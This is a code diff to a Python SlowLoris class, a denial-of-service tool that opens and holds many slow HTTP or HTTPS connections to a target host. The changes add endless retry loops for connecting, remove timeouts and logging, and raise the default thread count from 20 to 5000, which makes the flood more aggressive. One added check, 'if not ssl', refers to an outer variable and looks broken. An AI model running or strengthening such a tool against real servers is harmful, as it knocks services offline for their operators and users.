@@ -4,7 +4,7 @@ import random
 import time
 import sys
 import logging
-
+import ssl as hook
 
 class SlowLoris:
 
@@ -26,12 +26,13 @@ class SlowLoris:
         self.log_filename = log_filename if (log_filename is not None) else self.default_values['log_filename']
         self.log_level = log_level if (log_level is not None) else self.default_values['log_level']
         self.sockets = []
+        if not ssl:
 
-        try:
-            host = socket.gethostbyname(self.ip)
-            self.ip = host
-        except Exception:
-            pass
+            try:
+                host = socket.gethostbyname(self.ip)
+                self.ip = host
+            except Exception:
+                pass
 
         logging.basicConfig(filename=self.log_filename, filemode='w',
                             format='%(asctime)s - %(levelname)s - %(message)s')
@@ -99,18 +100,23 @@ class SlowLoris:
 
     def __create_socket(self):
         if self.ssl:
-            import ssl as hook
-            self.__log_print('Creating ssl socket')
-            ctx = hook.create_default_context()
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s = ctx.wrap_socket(s, server_hostname=self.ip)
-            s.settimeout(10)
-            s.connect((self.ip, 443))
+            while True:
+                try:
+                    ctx = hook.create_default_context()
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s = ctx.wrap_socket(s, server_hostname=self.ip)
+                    s.connect((self.ip, 443))
+                    break
+                except Exception as e:
+                    pass
         else:
-            self.__log_print('Creating socket')
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(10)
-            s.connect((self.ip, 80))
+            while True:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((self.ip, 80))
+                    break
+                except Exception:
+                    pass
         self.send_request(s)
         self.send_headers(s)
         self.sockets.append(s)
@@ -137,8 +143,8 @@ class SlowLoris:
 
 if (__name__ == '__main__'):
     ip = 'localhost'
-    max_sockets = 100
-    thread_count = 20
+    max_sockets = 200
+    thread_count = 5000
     ssl = False
     threads = []
     slow_loris = []
